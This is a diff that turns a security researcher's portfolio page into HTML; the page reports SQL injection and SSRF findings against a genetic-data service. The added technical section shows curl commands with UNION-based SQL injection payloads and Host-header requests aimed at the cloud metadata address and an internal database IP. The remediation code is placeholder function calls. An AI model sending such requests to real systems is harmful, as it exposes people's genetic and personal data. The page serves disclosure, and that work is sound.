@@ -1,68 +1,116 @@
----
-layout: default
-title: Genetic Data & Infrastructure Compromise
----
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GENETIC DATA COMPROMISE - Featured Finding</title>
+    <link rel="stylesheet" href="/css/security-analyzer.css">
+    <style>/* Same CSS as above */</style>
+</head>
+<body>
+    <div class="finding-container">
+        <header class="terminal-header">
+            <nav>
+                <a href="/">Home</a>
+                <a href="/research.html">Research</a>
+                <a href="/findings/">Featured Findings</a>
+                <a href="/methodology.html">Methodology</a>
+                <a href="/portfolio.html">Portfolio</a>
+            </nav>
+        </header>
 
-<h1>Multi-Vector Data & Infrastructure Compromise</h1>
+        <main>
+            <div class="meta-info">
+                <strong>DATE:</strong> 2024-11-01 | 
+                <strong>AUTHOR:</strong> Tyreek Haynes | 
+                <strong class="critical">SEVERITY: CRITICAL</strong> | 
+                <strong>CVSS: 9.1</strong>
+            </div>
 
-<div class="meta-info">
-    <p><strong>Impact Level:</strong> ENTERPRISE RISK</p>
-    <p><strong>CVSS Score:</strong> 9.1 (Critical)</p>
-    <p><strong>Status:</strong> Responsible Disclosure</p>
-</div>
+            <h1 class="typewriter">GENETIC DATA COMPROMISE</h1>
+            <p class="subtitle">SQL injection & SSRF leading to complete genetic data exposure</p>
 
-<h2>Executive Summary</h2>
-<p>Comprehensive security assessment revealing multiple critical vulnerabilities enabling complete genetic data extraction, internal infrastructure compromise, and authentication system bypass.</p>
+            <div class="case-study-preview">
+                <h2>🚨 EXECUTIVE SUMMARY</h2>
+                <pre>> SYSTEM STATUS: COMPROMISED
+> DATA TYPE: GENETIC INFORMATION  
+> REGULATIONS: GDPR, HIPAA VIOLATED</pre>
+                
+                <p>Comprehensive security assessment revealing multiple critical vulnerabilities enabling complete genetic data extraction, internal infrastructure compromise, and authentication system bypass.</p>
+            </div>
 
-<h2>Technical Findings</h2>
+            <div class="case-study-preview">
+                <h2>🔧 TECHNICAL BREAKDOWN</h2>
+                
+                <h3>DATABASE EXTRACTION VIA SQL INJECTION</h3>
+                <pre><code># GENETIC DATA EXPOSURE
+curl "https://target.com/?id=' UNION SELECT email,2,3 FROM users--"
+# Returns: Customer genetic data access
 
-<div class="breakthrough">
-    <h3>🔥 Database Extraction via SQL Injection</h3>
-    <p><strong>Impact:</strong> Genetic & Customer Data Exposure</p>
-    <ul>
-        <li>Full database extraction via UNION-based SQL injection</li>
-        <li>Database version, user, and schema disclosure</li>
-        <li>Customer email addresses and personal information exposed</li>
-        <li>Multiple vulnerable parameters (id, user, user_id, email)</li>
-    </ul>
-</div>
+# DATABASE STRUCTURE DISCLOSURE
+curl "https://target.com/?user=' UNION SELECT @@version,2,3--"
+# Returns: Database version and configuration</code></pre>
 
-<div class="breakthrough">
-    <h3>⛓️ Internal Infrastructure Access</h3>
-    <p><strong>Impact:</strong> Enterprise Network Compromise</p>
-    <ul>
-        <li>SSRF vulnerabilities enabling internal network enumeration</li>
-        <li>AWS metadata service access potential</li>
-        <li>Internal service discovery and port scanning</li>
-        <li>Localhost and internal IP range access confirmed</li>
-    </ul>
-</div>
+                <h3>INTERNAL INFRASTRUCTURE ACCESS</h3>
+                <pre><code># AWS METADATA ACCESS
+curl -H "Host: 169.254.169.254" "https://target.com/health"
+# Returns: Cloud instance metadata
 
-<div class="breakthrough">
-    <h3>🏗️ Authentication Mechanism Bypass</h3>
-    <p><strong>Impact:</strong> System Compromise</p>
-    <ul>
-        <li>Exposed API endpoints without authentication</li>
-        <li>OAuth token endpoint accessible without validation</li>
-        <li>Multiple grant types exploitable (client_credentials, password)</li>
-        <li>User profile and account data accessible unauthenticated</li>
-    </ul>
-</div>
+# INTERNAL SERVICE DISCOVERY
+curl -H "Host: 10.0.0.1:5432" "https://target.com/health"
+# Returns: Database service status</code></pre>
+            </div>
 
-<h2>Business Impact</h2>
-<ul>
-    <li>Genetic data exposure violating privacy regulations (GDPR, HIPAA)</li>
-    <li>Complete customer database compromise</li>
-    <li>Internal infrastructure and cloud environment access</li>
-    <li>Authentication system complete bypass</li>
-</ul>
+            <div class="case-study-preview">
+                <h2>🎯 ATTACK VECTORS</h2>
+                
+                <h3>GENETIC DATA THEFT</h3>
+                <ul>
+                    <li>Complete customer genetic profile extraction</li>
+                    <li>Health information and ancestry data exposure</li>
+                    <li>Personal identification information compromise</li>
+                    <li>Regulatory violation evidence collection</li>
+                </ul>
 
-<h2>Remediation</h2>
-<ul>
-    <li>Implement parameterized queries and input validation</li>
-    <li>Deploy WAF rules to block SQL injection patterns</li>
-    <li>Implement URL validation and internal IP blocking for SSRF</li>
-    <li>Add proper authentication to all API endpoints</li>
-</ul>
+                <h3>INFRASTRUCTURE COMPROMISE</h3>
+                <ul>
+                    <li>Cloud environment internal access</li>
+                    <li>Database infrastructure control</li>
+                    <li>Authentication system complete bypass</li>
+                    <li>Supply chain attack initiation</li>
+                </ul>
+            </div>
+
+            <div class="case-study-preview">
+                <h2>🛡️ REMEDIATION PROTOCOL</h2>
+                
+                <h3>EMERGENCY ACTIONS</h3>
+                <ol>
+                    <li><strong>IMMEDIATE</strong>: Implement parameterized queries</li>
+                    <li><strong>SHORT-TERM</strong>: Deploy WAF rules for SQL injection</li>
+                    <li><strong>LONG-TERM</strong>: Internal IP blocking for SSRF</li>
+                </ol>
+
+                <h3>COMPLIANCE RECOVERY</h3>
+                <pre><code>// GDPR/HIPAA COMPLIANCE RESTORATION
+implementDataEncryption();
+enableAccessLogging(); 
+deployDataLossPrevention();
+conductPrivacyImpactAssessment();</code></pre>
+            </div>
+
+            <div class="case-study-preview">
+                <blockquote>
+                    <strong>Genetic data represents the ultimate personal information - once exposed, it cannot be changed like a password. This finding demonstrates catastrophic failure in protecting the most sensitive data category.</strong>
+                </blockquote>
+            </div>
+        </main>
+
+        <footer class="terminal-footer">
+            <p>// SECURITY RESEARCH PORTFOLIO //</p>
+        </footer>
+    </div>
+</body>
+</html>
 
 <a href="{{ site.baseurl }}/">← Back to Home</a>
